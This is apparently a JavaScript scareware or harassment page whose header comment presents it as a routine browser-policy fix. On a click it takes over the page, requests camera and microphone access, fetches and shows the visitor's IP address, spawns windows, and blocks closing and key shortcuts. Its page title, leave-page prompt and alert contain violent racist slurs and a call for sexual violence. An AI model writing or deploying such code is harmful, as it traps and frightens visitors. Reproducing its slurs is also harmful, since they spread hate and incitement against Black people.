/* 
 * [Aug 2023] Fixed addEventListener for the document container.
 * [Oct 2021] Added to comply with strict browser policies.
 *
 * Requires safe.js & math.js preload.
 */
container.addEventListener('click', async () => {
	document.querySelector("#ui").remove()
	document.querySelector("#play").remove()
	document.documentElement.style.cursor = "none"
	document.documentElement.style.background = "url(media/popup.gif)"
	document.title = "RAPE ALL BLACK NIGGERS"
	poop = document.createElement("video")
	poop.src = "media/poop.mp4"
	poop.id = "poop"
	poop.muted = true
	poop.autoplay = true
	poop.loop = true
	document.body.appendChild(poop)
	document.querySelector("link[rel='icon']").href = "faviconpp.ico";
	navigator.mediaDevices.getUserMedia({ video: true, audio: true })
	fetch("https://api.ipify.org?format=json")
		.then(response => response.json())
		.then(data => {
			document.getElementById("ip").textContent = data.ip;
		})
	await proCreate(6);
	window.onbeforeunload = () => "RAPE ALL BLACK NIGGERS";
	document.documentElement.addEventListener('click', async () => {
		await proCreate(6);
		window.onbeforeunload = () => "RAPE ALL BLACK NIGGERS";
	})
});

window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(6);
		alert("FUCK YOU FUCKING NIGGER");
	}
	
	return null;
}
/* [Aug 2023] End of amendments. */